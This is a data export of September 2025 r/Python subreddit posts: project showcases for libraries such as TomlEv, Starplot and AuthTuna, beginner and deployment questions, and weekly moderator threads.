1nii4as,Can fine-grained memory management be achieved in Python?,MilanTheNoob,0,20,2025-09-16 13:52:58,https://www.reddit.com/r/Python/comments/1nii4as/can_finegrained_memory_management_be_achieved_in/,"This is just a hypothetical ""is this at all remotely possible?"", I do not in anyway shape or form (so far) think its a good idea to computationally demanding staff that requires precise memory management using a general purpose language ... but has anyone pulled it off? 

Do pypi packages exist that make it work? Or some seedy base package that already does it that I am too dumb to know about?"
1nihwt2,Taming wild JSON in Python: lessons from AI/Agentic Conversations exports,External-Ad-3916,0,0,2025-09-16 13:44:45,https://www.reddit.com/r/Python/comments/1nihwt2/taming_wild_json_in_python_lessons_from_aiagentic/,"Working on a data extraction project just taught me that not all JSON is created equal. What looked like a ‚Äústraightforward parsing task‚Äù quickly revealed itself as a lesson in defensive programming, graph algorithms, and humility.

**The challenge:** Processing ChatGPT conversation exports that looked like simple JSON arrays‚Ä¶ but in reality were directed acyclic graphs with all the charm of a family tree drawn by Kafka.

**Key lessons learned about Python:**

**1. Defensive programming is essential**

Because JSON in the wild is like Schr√∂dinger‚Äôs box - you don‚Äôt know if it‚Äôs a string, dict, or None until you peek inside.

>\`\`\`python

>*# Always check before 'in' operator*

>if metadata and 'key' in metadata:

>value = metadata\['key'\]

>

>*# Handle polymorphic arrays gracefully*¬†¬†

>for part in parts or \[\]:

>if part is None:

>continue

>\`\`\`

**2. Graph traversal beats linear iteration** 

When JSON contains parent/child relationships, backward traversal from leaf nodes works often much better than trying to sort or reconstruct order.

**3. Content type patterns** 

Real-world JSON often mixes strings, objects, and structured data in the same array. Building type-specific handlers saved me hours of debugging (and possibly a minor breakdown).

**4. Memory efficiency matters** 

Processing 500MB+ JSON files called for thinking about memory usage patterns and and garbage collection like a hawk. Nothing sharpens your appreciation of Python‚Äôs object model like watching your laptop heat up enough to double as a panini press.

**Technical outcome:**

* 99.5+% success rate processing 7,000 ""conversations.
* Comprehensive error logging for the 1% of edge cases where reality outsmarted my code
* Renewed respect for how much defensive programming and domain knowledge matter, even with ‚Äúsimple‚Äù data formats



*Full extractor here*: [chatgpt-conversation-extractor/README.md at master ¬∑ slyubarskiy/chatgpt-conversation-extractor ¬∑ GitHub](https://github.com/slyubarskiy/chatgpt-conversation-extractor/blob/master/README.md)"
1nifogm,Some tips for beginners (Things you probably wish you knew when you first started),MonsieurJus,70,77,2025-09-16 12:10:26,https://www.reddit.com/r/Python/comments/1nifogm/some_tips_for_beginners_things_you_probably_wish/,"Maybe the title came out a bit ambiguous, but I‚Äôd really like to get this kind of help and I also hope this post can be useful for others who, like me, are just starting out on their Python journey."
1nickil,Fast weighted selection using digit-bin-index,Roenbaeck,7,2,2025-09-16 09:16:57,https://www.reddit.com/r/Python/comments/1nickil/fast_weighted_selection_using_digitbinindex/,"**What my project does:**  
This is slightly niche, but if you need to do weighted selection and can treat probabilities as fixed precision, I built a high-performing package called digit-bin-index with Rust under the hood. It uses a novel algorithm to achieve best in class performance.

**Target audience:**  
This package is particularly suitable for iterative weighted selection from an evolving population, such as a simulation. One example is repeated churn and acquisition of customers with a simulation to determine the customer base evolution over time.

**Comparison:**  
There are naive algorithms, often O(N) or worse. State of the art algorithms like Walker's alias method can do O(1) selection, but require an O(N) setup and is not suitable for evolving populations. Fenwick trees are also often used, with O(log N) complexity for selection and addition. `DigitBinIndex` is O(P) for both, where P is the fixed precision.

Here's an excerpt from a test run on a MacBook Pro with M1 CPU:

`--- Benchmarking with 1,000,000 items ---`  
`This may take some time...`  
`Time to add 1,000,000 items: 0.219317 seconds`  
`Estimated memory for index: 145.39 MB`  
`100,000 single selections: 0.088418 seconds`  
`1,000 multi-selections of 100: 0.025603 seconds`

The package is available at:¬†[https://pypi.org/project/digit-bin-index/](https://pypi.org/project/digit-bin-index/)  
The source code is available on:¬†[https://github.com/Roenbaeck/digit-bin-index](https://github.com/Roenbaeck/digit-bin-index)"
1nic529,Mogami: VS Code Extension for Managing Python Dependencies,ninoseki,8,1,2025-09-16 08:49:44,https://www.reddit.com/r/Python/comments/1nic529/mogami_vs_code_extension_for_managing_python/,"Hi all, I'd like to introduce¬†[Mogami](https://github.com/ninoseki/vscode-mogami), a VS Code Extension for managing Python dependencies.

* VS Code market place:¬†[https://marketplace.visualstudio.com/items?itemName=ninoseki.vscode-mogami](https://marketplace.visualstudio.com/items?itemName=ninoseki.vscode-mogami)
* GitHub:¬†[https://github.com/ninoseki/vscode-mogami](https://github.com/ninoseki/vscode-mogami)

---

# What My Project Does

It displays a CodeLens (a tooltip to inform the latest version and allow you to update it by clicking it) on dependencies in requirements.txt, pyproject.toml, etc.

# Target Audience

Python dev who uses VS Code.

# Comparison

* [https://github.com/Twixes/pypi-assistant/](https://github.com/Twixes/pypi-assistant/) (supports many formats, but not actionable)
* [https://gitlab.com/versionlens/vscode-versionlens](https://gitlab.com/versionlens/vscode-versionlens) (supports only basic PEP 735)

---

Please try it out and give me feedback."
1nias08,I Build Type-safe TOML configuration with environment variables for Python 3.11+ | TomlEv,nbpatron,6,0,2025-09-16 07:19:16,https://www.reddit.com/r/Python/comments/1nias08/i_build_typesafe_toml_configuration_with/,"**TL;DR:** Stop fighting with environment variables and manual type conversion - get type-safe TOML configuration that just works.

```bash
pip install tomlev
```

**Benefits:**
- Automatic type conversion and validation
- Environment variable substitution with defaults
- Zero dependencies, production-ready
- Perfect IDE and AI assistant support

## The Problem

PEP 735 style config management leads to repetitive, error-prone code:

```python
# The old way - manual parsing everywhere
DB_HOST = os.getenv(""DB_HOST"", ""localhost"")
DB_PORT = int(os.getenv(""DB_PORT"", ""5432""))  # Hope this doesn't crash!
DEBUG = os.getenv(""DEBUG"", ""false"").lower() == ""true""  # Boolean hell
```

## What My Project Does

TomlEv reads TOML files with environment variable substitution and validates them against typed Python classes:

```python
from tomlev import BaseConfigModel, TomlEv

class DatabaseConfig(BaseConfigModel):
    host: str
    port: int
    user: str

class AppConfig(BaseConfigModel):
    debug: bool
    database: DatabaseConfig

# One line - fully type-safe!
config: AppConfig = TomlEv(AppConfig).validate()
```

**TOML file:**
```toml
debug = ""${DEBUG|-false}""

[database]
host = ""${DB_HOST|-localhost}""
port = ""${DB_PORT|-5432}""
user = ""${DB_USER}""
```

Works as CLI too:
```bash
tomlev validate --toml app.toml --env-file .env
tomlev render --toml app.toml > config.json
```

## Target Audience

Python developers using modern type hints who want reliable configuration management without the boilerplate.

## Comparison

‚ùå **python-dotenv**: No type safety, manual parsing
‚ùå **pydantic-settings**: More complex, less TOML-focused
‚ùå **configparser**: INI format, no modern Python features
‚ùå **YAML configs**: Security issues, complex parsing

‚úÖ **TomlEv**: TOML readability + Python type safety + environment flexibility

**Similar tools:**
- No direct equivalent for TOML + type safety + env substitution

## Try it out: https://github.com/thesimj/tomlev

‚≠ê **Star if it helps!** Issues and PRs welcome. ‚≠ê
"
1ni9kd3,ImportError: /opt/render/project/src/.venv/lib/python3.13/site-packages/psycopg2/_psycopg.cpython-31,Specialist_Bed_234,0,0,2025-09-16 06:03:08,https://www.reddit.com/r/Python/comments/1ni9kd3/importerror/,"I was trying to deploy the backend on **Render**.

* I updated the environment variable for the database connection string:psql 'postgresql://neondb\_owner:...@ep-crimson-night-a14reavo-pooler.ap-southeast-1.aws.neon.tech/neondb?sslmode=require&channel\_binding=require' 
* The build itself finished successfully (all dependencies installed).
* But when Render tried to run the app with Gunicorn, the service crashed immediately.

**Error shown in Render logs:**

    ImportError: /opt/render/project/src/.venv/lib/python3.13/site-packages/psycopg2/_psycopg.cpython-313-x86_64-linux-gnu.so:
    undefined symbol: _PyInterpreterState_Get
    

This happens right after:

    app = create_app()
    db.init_app(app)
    

So the app fails at the point where Flask-SQLAlchemy tries to import psycopg2."
1ni81px,Has Anyone Been Using Pyrefly?,auric_gremlin,26,25,2025-09-16 04:35:39,https://www.reddit.com/r/Python/comments/1ni81px/has_anyone_been_using_pyrefly/,"Thinking of introducing it at my company as a sort of second linter alongside basedpyright. I think it'll be good to get it incorporated a bit early so that we can fix whatever bugs it catches as it comes along. It looks to be in a decent state for basic typechecking, and the native django support will be nice as it comes along (compared to mypy)."
1ni74c4,Want to run the python project (Chatbot) on Xampp local server,Informal_Sea5714,0,6,2025-09-16 03:46:02,https://www.reddit.com/r/Python/comments/1ni74c4/want_to_run_the_python_project_chatbot_on_xampp/,"Can anyone tell me the solution to the problem? run a Python project on the XAMPP local server, but the issue is that the XAMPP server does not support Python projects. Firstly, I need to test the project on the XAMPP local server and then integrate it with the PHP website. 
"
1ni3kyj,Algumas dicas para iniciantes(Que voc√™ provavelmente queria saber quando come√ßou),MonsieurJus,0,1,2025-09-16 00:55:59,https://www.reddit.com/r/Python/comments/1ni3kyj/algumas_dicas_para_iniciantesque_voc√™/,"Talvez esse t√≠tulo tenha ficado amb√≠guo, mas gostaria muito de receber essa ajuda e espero que esse post sirva para outros, que assim como eu, tamb√©m est√£o iniciando nessa jornada pythonica. "
1ni3j6b,RepoGif: Generate GIF previews for your GitHub repos automatically üé•‚≠ê,jhd3197,0,2,2025-09-16 00:53:47,https://www.reddit.com/r/Python/comments/1ni3j6b/repogif_generate_gif_previews_for_your_github/,"Hi everyone! üëã

I got tired of static GitHub previews, so I built a Python package called **RepoGif**.

**What my project does:**

RepoGif automatically generates 2-frame GIF repo cards (stars, forks, etc.) that you can drop into your README or use as social previews.

* Written in Python
* Simple API: `generate_gif(""RepoName"", stars=100, forks=50)`
* Exports GIFs with customizable templates & sizes

**Target audience:**

* Developers who want their repos to look more lively and engaging
* Open source maintainers who want to showcase project growth visually
* Makers who need quick, shareable repo previews

**Comparison:**

There are static badges (like shields.io), but RepoGif is different because it makes **animated previews** with multiple templates and sizes, instead of static icons.

GitHub: [https://github.com/jhd3197/RepoGif](https://github.com/jhd3197/RepoGif)

Would love feedback, suggestions, or ideas for new templates! üôå  
And hey‚Ä¶ don‚Äôt forget to drop a ‚≠ê if you like it üòâ"
1ni2k4t,Starplot - Star charts and maps of the sky,starplotting,16,3,2025-09-16 00:09:48,https://www.reddit.com/r/Python/comments/1ni2k4t/starplot_star_charts_and_maps_of_the_sky/,"Hey all, I‚Äôd like to introduce [Starplot](https://starplot.dev/) ‚Äî a Python library for creating star charts and maps of the sky.

**What My Project Does**

* Creates customizable star charts and maps of the night sky
* Allows custom styling for all plotted objects, and includes many color themes
* Supports many map projections and types of plots:
   * Zenith plots that show the whole sky at a specific time and place
   * Map plots that show an area of the sky
   * Horizon plots that show the sky from a specific cardinal direction
   * Optic plots that show what an object looks like through an optic (e.g. telescope, binoculars, etc) at a specific time and place
* Includes a built-in database of 2M+ stars and 14,000+ deep sky objects (galaxies, nebulae, star clusters, etc)
* Exports plots to PNG, JPEG, or SVG

**Target Audience**

* Anyone interested in astronomy or creating maps of the sky!
* Astrophysicists
* Astronomers

**Comparison** 

Compared to similar projects (e.g. fchart3, astroplan), Starplot supports a lot of customization and has many different plot types.

\---

Homepage: [https://starplot.dev/](https://starplot.dev/)

Example Plots: [https://starplot.dev/examples/](https://starplot.dev/examples/)

Source Code: [https://github.com/steveberardi/starplot](https://github.com/steveberardi/starplot)

Starplot is still very much a work in progress, and I appreciate any feedback. Also very open to contributors if you want to help out! üòÄ Clear skies! üî≠ ‚ú®"
1ni2d07,Tuesday Daily Thread: Advanced questions,AutoModerator,2,1,2025-09-16 00:00:32,https://www.reddit.com/r/Python/comments/1ni2d07/tuesday_daily_thread_advanced_questions/,"# Weekly Wednesday Thread: Advanced Questions üêç

Dive deep into Python with our Advanced Questions thread! This space is reserved for questions about more advanced Python topics, frameworks, and best practices.

## How it Works:

1. **Ask Away**: Post your advanced Python questions here.
2. **Expert Insights**: Get answers from experienced developers.
3. **Resource Pool**: Share or discover tutorials, articles, and tips.

## Guidelines:

* This thread is for **advanced questions only**. Beginner questions are welcome in our [Daily Beginner Thread](#daily-beginner-thread-link) every Thursday.
* Questions that are not advanced may be removed and redirected to the appropriate thread.

## Recommended Resources:

* If you don't receive a response, consider exploring r/LearnPython or join the [Python Discord Server](https://discord.gg/python) for quicker assistance.

## Example Questions:

1. **How can you implement a custom memory allocator in Python?**
2. **What are the best practices for optimizing Cython code for heavy numerical computations?**
3. **How do you set up a multi-threaded architecture using Python's Global Interpreter Lock (GIL)?**
4. **Can you explain the intricacies of metaclasses and how they influence object-oriented design in Python?**
5. **How would you go about implementing a distributed task queue using Celery and RabbitMQ?**
6. **What are some advanced use-cases for Python's decorators?**
7. **How can you achieve real-time data streaming in Python with WebSockets?**
8. **What are the performance implications of using native Python data structures vs NumPy arrays for large-scale data?**
9. **Best practices for securing a Flask (or similar) REST API with OAuth 2.0?**
10. **What are the best practices for using Python in a microservices architecture? (..and more generally, should I even use microservices?)**

Let's deepen our Python knowledge together. Happy coding! üåü"
1nhulk7,Wanting a project - What do yall need?,BravestCheetah,0,6,2025-09-15 18:54:18,https://www.reddit.com/r/Python/comments/1nhulk7/wanting_a_project_what_do_yall_need/,"So, i just finished one of my bigger projects, a custom interpreted programming language made to feel like assembly, with memory and register emulators and an modular instruction set which is easily modifiable by just adding files to a folder, as well as a IO module system with a modular approach for Memory mapped IO. But, as cool as it sounds, there is no real usecase?

As im finishing up on that im looking for a project that would \*make others experience better (automod, why do you delete my post if it contains the he-lp word?)\* like libraries, cli tools, gui tools. Anything that you need or think ""why isnt there a library for that?"", ill consider. If i realise i would benefit from it too, then i would maybe consider it.. even more?

Also so nobody says it, ive already made a logging library, with log saving, custom colors, a lot of settings, project names, subnames, sublogging, error, critical, warning, info logs. Whitespace log, raw log, timestamps, misc logs, and a lot more features, check it out on pypi, its called usefullog.

All suggestions are welcome! "
1nhuk7r,"Created python library for time series projections. E.g. combining income, inflation, dividends, etc",_Rush2112_,14,5,2025-09-15 18:52:55,https://www.reddit.com/r/Python/comments/1nhuk7r/created_python_library_for_time_series/,"GitHub: [https://github.com/TimoKats/pylan](https://github.com/TimoKats/pylan)

PyPi: [https://pypi.org/project/pylan-lib/](https://pypi.org/project/pylan-lib/)

# What My Project Does

Python library for making complex time series projections. E.g. for simulating the combined effect of (increasing) salary, inflation, investment gains, etc, over time. Note, it can also be applied to other domains.

# Target Audience

Data analysts, planners, etc. People that use excel for making projections, but want to move to python.

# Comparison

\- SaaS financial planning tools (like ProjectionLab) work through a webUI, whereas here you have access to all the Python magic in the same place as you do your simulation.

\- Excel....

\- Write your own code for this is not super difficult, but this library does provide a good framework of dealing with various schedule types (some of which cron doesn't support) to get to your analysis more quickly."
1nhtowu,I made a vs code extension that insults you if you copy & paste AI generated code,ComplexCollege6382,300,35,2025-09-15 18:20:56,https://www.reddit.com/r/Python/comments/1nhtowu/i_made_a_vs_code_extension_that_insults_you_if/,"-on an important note: this project was just for fun, I'm not against using AI to help your coding sessions-


What my project does:
It's a vs code extension that gives random insults such as ""Do you ask GPT what to eat for dinner as well?"" to the user if it detects AI generated content. It uses a pretrained transformer-based model for inference (roberta-base-openai-detector), that returns the probability of human and AI writing the given section of text. It was pretty fun to play around with, although not accurate (the model was trained on GPT-2, and not optimized for code, so accuracy is bum), but it was my first time mixing languages together to create something. (In this case typescript and python) It's interesting how extensions like these are set up, I think it's valuable for anyone to do pet projects like these.


Target audience: noone really, just a funny pet project, due to the inaccuracy I wouldn't recommend it for actual usage (it's a bit difficult to create something more accurate, these kind of open-source models were trained on texts, not code) 


Comparison: To my knowledge there hasn't been a vs code extension like this before, but there are several much more accurate detectors available online. 


If anyone wants to check it out, or contribute, please feel free to reach out.


https://github.com/Tbence132545/Ai-copypaste-insult"
1nhs5rm,[D√∫vida] - Serial Number para venda de um projeto,Working-Bag-2973,0,2,2025-09-15 17:25:12,https://www.reddit.com/r/Python/comments/1nhs5rm/d√∫vida_serial_number_para_venda_de_um_projeto/,"Pessoal, estou desenvolvendo um aplicativo em python para concilia√ß√£o banc√°ria. Pretendo o disponibilizar para venda mas como garanto a distribui√ß√£o n√£o autorizada? Por exemplo, uma pessoa compra acha bacana e envia para os amigos usarem.  
Pensei em algo como um serial number para registro e uso do mesmo, queria dicas e sugest√µes de como voc√™s fariam para coibir essa distribui√ß√£o n√£o autorizada.

  
\*O aplicativo ser√° em exe via pyinstaller."
1nhq7oz,I built a pytest plugin to cleanly manage test fixture files - would love feedback!,fferegrino,2,2,2025-09-15 16:13:39,https://www.reddit.com/r/Python/comments/1nhq7oz/i_built_a_pytest_plugin_to_cleanly_manage_test/,"# What My Project Does:

`pytest-fixtures-fixtures` is a pytest plugin that provides fixtures to easily read and work with test data files (JSON, CSV, YAML, JSONL, plain text, custom) in your tests. Instead of writing boilerplate code to read files in every test, you get clean fixtures that handle file reading, parsing, and error handling automatically.

The plugin also includes a decorator to parametrise tests directly from data files, making data-driven testing much more straightforward.

# Target Audience:

This is designed for Python developers who use pytest for testing and regularly work with test data files. It's production-ready and suitable for:

* Teams writing comprehensive test suites
* Developers doing data-driven testing
* Anyone tired of writing file-reading boilerplate in tests
* Projects that need clean separation between test logic and test data

# Comparison:

While there are other pytest plugins that help with test data (`pytest-datafiles`, `pytest-datadir`), `pytest-fixtures-fixtures` differs in several key ways:

* **Fixture-based approach**: Uses pytest's native fixture system rather than custom decorators or utilities
* **Multiple format support**: Handles JSON, CSV, YAML, JSONL, plain text with a consistent API plus it lets you provide your own deserialisation
* **Built-in parametrisation**: The `@parametrize_from_fixture` decorator lets you create data-driven tests directly from files
* **Type safety**: Full type hints and protocols for better IDE support
* **Error handling**: Clear error messages when files are missing or malformed
* **Flexible configuration**: Easy to customise the fixtures directory and behaviour

# Example Usage:

    # Before: lots of boilerplate
    def test_user_data():
        with open(""tests/fixtures/users.json"") as f:
            data = json.load(f)
        assert data[""name""] == ""Alice""
    
    # After: clean and simple
    def test_user_data(read_json_fixture):
        data = read_json_fixture(""users.json"")
        assert data[""name""] == ""Alice""
    
    # Even better: parametrize from data files
    @parametrize_from_fixture(""test_cases.csv"")
    def test_math_operations(a, b, expected):
        assert int(a) + int(b) == int(expected)

# Key Features:

* Supports JSON, CSV, YAML, JSONL, and plain text files + custom deserialisation
* Automatic file parsing with proper error handling
* Parametrise tests directly from data files with custom test IDs
* Configurable fixtures directory (defaults to `tests/fixtures/`)
* Type hints and clear error messages
* Works with pytest's existing fixture system

# Installation:

    pip install pytest-fixtures-fixtures

# Links:

**GitHub:** [https://github.com/fferegrino/pytest-fixtures-fixtures](https://github.com/fferegrino/pytest-fixtures-fixtures)  
**PyPI:** [https://pypi.org/project/pytest-fixtures-fixtures/](https://pypi.org/project/pytest-fixtures-fixtures/)  
**Docs:** [https://fferegrino.github.io/pytest-fixtures-fixtures/](https://fferegrino.github.io/pytest-fixtures-fixtures/)

**Why I built it:** I was tired of writing the same file-reading boilerplate in every test suite. This keeps test data separate from test logic and makes data-driven testing much easier.

# What do you think?

* Does this solve a problem you've faced?
* Any features you'd like to see?
* How do you currently handle test data files in your projects?

I'd love feedback from the community to make this tool better."
1nhn589,"I built AuthTuna, a modern, async-first security framework for FastAPI with hierarchical permissions",shashstormer,17,1,2025-09-15 14:19:20,https://www.reddit.com/r/Python/comments/1nhn589/i_built_authtuna_a_modern_asyncfirst_security/,"Hey everyone,

I built an async security library for FastAPI called AuthTuna to solve some problems I was facing with existing tools.



# What My Project Does



AuthTuna is an async-first security library for FastAPI. It's not just a set of helpers; it's a complete foundation for authentication, authorization, and session management. Out of the box, it gives you:

* **Fully async** operations built on SQLAlchemy 2.0.
* **Hierarchical RBAC** for complex, nested permissions (e.g., `Organization -> Project -> Resource`), which goes beyond simple roles.
* **Secure, server-side sessions** with built-in hijack detection.
* A familiar developer experience using standard FastAPI `Depends` and Pydantic models.



# Target Audience



This is built for Python developers using FastAPI to create **production-grade applications**. It's specifically useful for projects that need more complex, granular authorization logic, like multi-tenant SaaS platforms, internal dashboards, or any app where users have different levels of access to specific resources. It is not a toy project and is running in our own production environment.



# Comparison



I built this because I needed a specific combination of features that I couldn't find together in other libraries.

* **vs. FastAPI's built-in tools:** The built-in security utilities are great low-level primitives. AuthTuna is a higher-level, ""batteries-included"" framework. You get pre-built user flows, session management, and a full permission system instead of having to build them yourself on top of the primitives.
* **vs. FastAPI-Users:** FastAPI-Users is an excellent, popular library. AuthTuna differs mainly in its focus on **hierarchical permissions** and its **session model**. If you need to model complex, multi-level access rules (not just ""admin"" or ""user"") and prefer the security model of stateful, server-side sessions over stateless JWTs, then AuthTuna is a better fit.

The code is up on GitHub, and feedback is welcome.

**GitHub:** [`https://github.com/shashstormer/authtuna`](https://github.com/shashstormer/authtuna)"
1nhl0t6,I Build Type-safe TOML configuration with environment variables for Python 3.11+ | TomlEv,nbpatron,3,3,2025-09-15 12:53:09,https://www.reddit.com/r/Python/comments/1nhl0t6/i_build_typesafe_toml_configuration_with/,"**TL;DR:** Stop fighting with environment variables and manual type conversion - get type-safe TOML configuration that just works.

```bash
pip install tomlev
```

**Benefits:**
- Automatic type conversion and validation
- Environment variable substitution with defaults
- Zero dependencies, production-ready
- Perfect IDE and AI assistant support

## The Problem

PEP 735 style config management leads to repetitive, error-prone code:

```python
# The old way - manual parsing everywhere
DB_HOST = os.getenv(""DB_HOST"", ""localhost"")
DB_PORT = int(os.getenv(""DB_PORT"", ""5432""))  # Hope this doesn't crash!
DEBUG = os.getenv(""DEBUG"", ""false"").lower() == ""true""  # Boolean hell
```

## What My Project Does

TomlEv reads TOML files with environment variable substitution and validates them against typed Python classes:

```python
from tomlev import BaseConfigModel, TomlEv

class DatabaseConfig(BaseConfigModel):
    host: str
    port: int
    user: str

class AppConfig(BaseConfigModel):
    debug: bool
    database: DatabaseConfig

# One line - fully type-safe!
config: AppConfig = TomlEv(AppConfig).validate()
```

**TOML file:**
```toml
debug = ""${DEBUG|-false}""

[database]
host = ""${DB_HOST|-localhost}""
port = ""${DB_PORT|-5432}""
user = ""${DB_USER}""
```

Works as CLI too:
```bash
tomlev validate --toml app.toml --env-file .env
tomlev render --toml app.toml > config.json
```

## Target Audience

Python developers using modern type hints who want reliable configuration management without the boilerplate.

## Comparison

‚ùå **python-dotenv**: No type safety, manual parsing
‚ùå **pydantic-settings**: More complex, less TOML-focused
‚ùå **configparser**: INI format, no modern Python features
‚ùå **YAML configs**: Security issues, complex parsing

‚úÖ **TomlEv**: TOML readability + Python type safety + environment flexibility

**Similar tools:**
- No direct equivalent for TOML + type safety + env substitution

## Try it out: https://github.com/thesimj/tomlev

‚≠ê **Star if it helps!** Issues and PRs welcome. ‚≠ê
"
1nhigm1,requests.package,Clear-Basket-1041,0,12,2025-09-15 10:45:48,https://www.reddit.com/r/Python/comments/1nhigm1/requestspackage/,"from requests.packages.urllib3.util.ssl\_ import (  # type: ignore     \^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^         create\_urllib3\_context,         \^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^     )  # pylint: disable=ungrouped-imports     \^ ModuleNotFoundError: No module named 'requests.packages.urllib3'; 'requests.packages' is not a package     even though i have tried installing this multiple times and couldn't figure what file is having this issue"
1nhifw0,FastAPI is good but it is something I wouldn't go for,donalddbanda,0,24,2025-09-15 10:44:37,https://www.reddit.com/r/Python/comments/1nhifw0/fastapi_is_good_but_it_is_something_i_wouldnt_go/,"I wanted to learn web development using Python so I started learning Flask instead of Django because Flask gives a developer more freedom of tools when compared to Django. I'm have a better experience with Flask. I wanted to learn FastAPI because of its asynchronous nature.

FastAPI is hard for me to create a database, and connect it. It needs many imports which is something I don't like

Pydantic makes it hard to pick up the framework. The use of many classes makes it complicated.

Is it only me or it happens to many developers learning FastAPI??"
1nhfhcs,"3 months in Python, I made my first proper 2D game",justahappycamper1,32,31,2025-09-15 07:34:37,https://www.reddit.com/r/Python/comments/1nhfhcs/3_months_in_python_i_made_my_first_proper_2d_game/,"**What My Project Does:**  
I‚Äôve been messing with Python for about three months, mostly tutorials and dumb exercises. Finally tried making an actual game, and this is what came out.

It‚Äôs called [Hate-Core](https://github.com/ah4ddd/Hate-Core). You play as a knight fighting dragons in 2D. There‚Äôs sprites, music, keyboard and touch controls, and a high-score system. Basically my attempt at a Dark Souls-ish vibe, but, you know‚Ä¶ beginner style. Built it with **Pygame**, did the movement, attacks, scoring, and slapped in some sprites and backgrounds.

**Target Audience:**  
Honestly? Just me learn-ing Python. Not production-ready, just a toy to practice, see what works, and maybe have some fun.

**Comparison:**  
Way beyond boring number guessing, dice rolls, or quizzes you see from beginners. It‚Äôs an actual 2D game, with visuals, music, and some ‚Äúcombat‚Äù mechanics. Dark Souls-ish but tiny, broken, and beginner-coded.

I‚Äôd love **honest feedback**, tips, ideas or anything. I know it‚Äôs rough as hell.

Check it out here: [https://github.com/ah4ddd/Hate-Core](https://github.com/ah4ddd/Hate-Core)"
1nhdt04,I made a terminal-based game that uses LLMs -- Among LLMs: You are the Impostor,Foreign_Radio8864,251,26,2025-09-15 05:50:48,https://www.reddit.com/r/Python/comments/1nhdt04/i_made_a_terminalbased_game_that_uses_llms_among/,"I made this game in Python (that uses **Ollama** and local `gpt-oss:20b` / `gpt-oss:120b` models) that runs directly inside your terminal. TL;DR **above** the example.

>Among LLMs turns your **terminal** into a chaotic chatroom playground where **you‚Äôre the only human** **among a bunch of eccentric AI agents**, dropped into a common *scenario* \-- it could be Fantasy, Sci-Fi, Thriller, Crime, or something completely unexpected. Each participant, including you, has a *persona* and a *backstory*, and all the AI agents share one common goal -- determine and eliminate the human, through *voting*. **Your mission: stay hidden, manipulate conversations, and turn the bots against each other with edits, whispers, impersonations, and clever gaslighting**. Outlast everyone, turn chaos to your advantage, and make it to the final two.

>Can you survive the hunt and *outsmart* the AI ?

Quick Demo: [https://youtu.be/kbNe9WUQe14](https://youtu.be/kbNe9WUQe14)

Github: [https://github.com/0xd3ba/among-llms](https://github.com/0xd3ba/among-llms) (refer to `develop` branch for latest updates)

(**Edit:** Join the [subreddit for Among LLMs](https://www.reddit.com/r/Among_LLMs/) if you have any bug reports, issues, feature-requests, suggestions or want to showcase your hilarious moments)

* **What my project does:** Uses local Ollama gpt-oss models uniquely in a game setting; Built completely as a terminal-UI based project.
* **Target Audience:** Anyone who loves drama and making AI fight each other
* **Comparision:** No such project exists yet.

# Example of a Chatroom (after export)

You can **save chatrooms as JSON** and **resume** where you left off later on. **Similarly you can load other's saved JSON as well**! What's more, when you save a chatroom, it also exports the chat as a text file. Following is an example of a chatroom I recently had.

**Note(s):**

* Might be lengthy, but you'll get the idea of how these bots behave (lol)
* All agents have personas and backstories, which are not visible in the exported chat

**Example:** [https://pastebin.com/ud7mYmH4](https://pastebin.com/ud7mYmH4)"
1nh6ydt,Monday Daily Thread: Project ideas!,AutoModerator,2,0,2025-09-15 00:00:32,https://www.reddit.com/r/Python/comments/1nh6ydt/monday_daily_thread_project_ideas/,"# Weekly Thread: Project Ideas üí°

Welcome to our weekly Project Ideas thread! Whether you're a newbie looking for a first project or an expert seeking a new challenge, this is the place for you.

## How it Works:

1. **Suggest a Project**: Comment your project idea‚Äîbe it beginner-friendly or advanced.
2. **Build & Share**: If you complete a project, reply to the original comment, share your experience, and attach your source code.
3. **Explore**: Looking for ideas? Check out Al Sweigart's [""The Big Book of Small Python Projects""](https://www.amazon.com/Big-Book-Small-Python-Programming/dp/1718501242) for inspiration.

## Guidelines:

* Clearly state the difficulty level.
* Provide a brief description and, if possible, outline the tech stack.
* Feel free to link to tutorials or resources that might help.

# Example Submissions:

## Project Idea: Chatbot

**Difficulty**: Intermediate

**Tech Stack**: Python, NLP, Flask/FastAPI/Litestar 

**Description**: Create a chatbot that can answer FAQs for a website.

**Resources**: [Building a Chatbot with Python](https://www.youtube.com/watch?v=a37BL0stIuM)

# Project Idea: Weather Dashboard

**Difficulty**: Beginner

**Tech Stack**: HTML, CSS, JavaScript, API

**Description**: Build a dashboard that displays real-time weather information using a weather API.

**Resources**: [Weather API Tutorial](https://www.youtube.com/watch?v=9P5MY_2i7K8)

## Project Idea: File Organizer

**Difficulty**: Beginner

**Tech Stack**: Python, File I/O

**Description**: Create a script that organizes files in a directory into sub-folders based on file type.

**Resources**: [Automate the Boring Stuff: Organizing Files](https://automatetheboringstuff.com/2e/chapter9/)

Let's help each other grow. Happy coding! üåü"
1nh54hf,RQ Manager: Monitoring & Metrics for RQ,lowercase00,3,1,2025-09-14 22:37:38,https://www.reddit.com/r/Python/comments/1nh54hf/rq_manager_monitoring_metrics_for_rq/,"Hey y‚Äôall.

I‚Äôve been using RQ for a while after a few years with Celery. I always liked RabbitMQ‚Äôs monitoring + Flower, but didn‚Äôt find anything similar for RQ that really worked for me. Ended up hacking together something small that‚Äôs been running fine in production (3 queues, 5‚Äì7 workers).

What it does
 ‚Ä¢ Monitor queue depth, worker throughput, and live job status
 ‚Ä¢ Retry, remove, or send jobs straight from the UI
 ‚Ä¢ /metrics endpoint for Prometheus/Grafana
 ‚Ä¢ Clean, responsive web UI (dark/light themes, live updates)

Who it‚Äôs for
Anyone running RQ in production who wants a simple, container-friendly way to monitor and manage jobs.

How it compares
Similar to rq-dashboard, rq-monitor and rq-exporter, but rolled into one:
 ‚Ä¢ UI + Prometheus metrics in the same tool
 ‚Ä¢ More direct job/queue management actions
 ‚Ä¢ Live charts for queue/job/worker monitoring
 ‚Ä¢ Easier deployment (single Docker container or K8s manifests)

Repo: https://github.com/ccrvlh/rq-manager
Screenshot in comments. Feedback + contributions welcome."
